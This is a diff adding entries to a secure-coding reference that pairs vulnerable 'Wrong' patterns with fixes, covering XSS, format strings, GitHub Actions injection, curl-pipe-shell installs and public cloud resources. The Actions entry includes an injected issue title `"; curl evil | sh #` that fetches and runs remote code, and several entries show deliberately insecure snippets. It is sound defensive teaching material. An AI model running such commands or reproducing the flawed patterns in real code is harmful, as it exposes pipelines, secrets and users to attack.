@@ -737,6 +737,13 @@ Wrong: const id = req.params.id; db.query("SELECT * FROM u WHERE id = " + id)
 Right: parameterized queries — db.query(sql, [id]). Or the ORM's normal query API.
 Watch: table and column names cannot be parameterized — allowlist them instead.
 
+## taint-xss
+OWASP: 17,19,20 | CWE-79 | A05:2025
+Request data is written straight into the HTTP response. Whatever HTML or script the caller sends runs in the next visitor's browser.
+Wrong: res.send("<h1>" + req.query.q + "</h1>")
+Right: render through a template engine that escapes by default, or return JSON — res.json({ q }).
+Watch: setting Content-Type: text/plain helps only if the browser is not told otherwise; escape anyway.
+
 ## fail-open-catch
 OWASP: 107,109 | CWE-755 | A10:2025
 Returning success from an exception handler grants access when the check itself failed. The error path becomes the bypass.
@@ -974,3 +981,45 @@ Hardcoding encryption keys or master secrets into firmware sources allows attack
 Wrong: #define DEVICE_KEY "a1b2c3d4e5f60718293a4b5c6d7e8f90"
 Right: use unique per-device keys provisioned in a Hardware Root of Trust (Secure Element / TPM / ARM TrustZone).
 Watch: never share symmetric master keys across a fleet of physical IoT devices.
+
+## assert-security-check
+OWASP: 76,78 | CWE-617 | A01:2025
+`assert` is stripped when Python runs with -O, so the check disappears in exactly the builds that ship.
+Wrong: assert user.is_admin
+Right: if not user.is_admin: raise PermissionDenied (or return 403)
+Watch: the same applies to any security check written as an assert — ownership, tenancy, input bounds.
+
+## format-string
+OWASP: 195,196 | CWE-134 | A05:2025
+A variable used as the format string lets the caller supply %x and %n: read the stack, or write to memory.
+Wrong: printf(user); fprintf(stderr, msg); syslog(LOG_ERR, msg)
+Right: printf("%s", user); fprintf(stderr, "%s", msg); syslog(LOG_ERR, "%s", msg)
+Watch: compile with -Wformat -Wformat-security -Werror=format-security so the compiler catches new ones.
+
+## gha-script-injection
+OWASP: Software Supply Chain CS | CWE-78 | A03:2025
+`${{ github.event... }}` is pasted into the shell script before it runs. An issue title like `"; curl evil | sh #` runs with the workflow's token.
+Wrong: run: echo "${{ github.event.issue.title }}"
+Right: env: { TITLE: ${{ github.event.issue.title }} } then run: echo "$TITLE"
+Watch: branch names (head_ref), commit messages and author names are attacker-controlled too.
+
+## gha-pull-request-target
+OWASP: Software Supply Chain CS | CWE-829 | A08:2025
+pull_request_target runs in the base repository with secrets and a write token, even for pull requests from forks.
+Wrong: on: pull_request_target, then actions/checkout with ref: ${{ github.event.pull_request.head.sha }} and npm install
+Right: use pull_request for anything that builds or runs PR code. Keep pull_request_target for labelling and commenting only.
+Watch: a later workflow_run that downloads the PR's artifacts has the same problem.
+
+## curl-pipe-shell
+OWASP: Software Supply Chain CS | CWE-494 | A08:2025
+Piping a download into a shell runs whatever the server (or anyone in between) returns, with no check and no record.
+Wrong: curl -fsSL https://example.com/install.sh | bash
+Right: curl -fsSLo install.sh URL && echo "<sha256>  install.sh" | sha256sum -c - && bash install.sh
+Watch: a pinned version in the URL is not a checksum; the content behind it can still change.
+
+## tf-public-access
+OWASP: Infrastructure as Code CS | CWE-284 | A01:2025
+A public bucket ACL, a disabled public access block, a database marked publicly accessible, or ingress from 0.0.0.0/0 exposes the resource to the whole internet.
+Wrong: acl = "public-read"; restrict_public_buckets = false; publicly_accessible = true; ingress { cidr_blocks = ["0.0.0.0/0"] }
+Right: private buckets behind a CDN with origin access control; ingress from known ranges or a security-group reference.
+Watch: 0.0.0.0/0 on 443 for a public load balancer is expected — on 22, 3389 or a database port it is not.
